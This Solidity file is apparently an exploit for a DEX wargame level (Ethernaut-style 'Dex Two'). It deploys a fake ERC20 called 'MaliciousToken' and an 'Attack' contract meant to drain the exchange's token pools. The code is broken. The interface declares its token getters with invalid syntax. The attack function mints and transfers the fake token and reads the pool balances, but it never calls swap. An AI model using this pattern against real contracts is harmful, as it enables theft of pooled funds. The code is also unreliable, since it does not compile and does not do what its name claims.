// SPDX-License-Identifier: CC0-1.0
pragma solidity ^0.8.20;
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

interface Dex2 {
    function swap(address from, address to, uint256 amount) external;
    address external view token1;
    address external view token2;
}

contract MaliciousToken is ERC20 {
    constructor(uint256 initialSupply) ERC20("MaliciousToken", "MT") {
        _mint(msg.sender, initialSupply);
    }
}

contract Attack {
    Dex2 public dex2;

    constructor(Dex2 _dex2) {       
        dex2 = _dex2;
    }

    function attack() public {
        // Tổng số token chính xác sẽ được dùng
        IERC20 maliciousToken = IERC20(new MaliciousToken(4));
        maliciousToken.transfer(address(dex2), 1);
        IERC20(dex2.token1()).balanceOf(address(dex2));
        IERC20(dex2.token2()).balanceOf(address(dex2));
    }
}
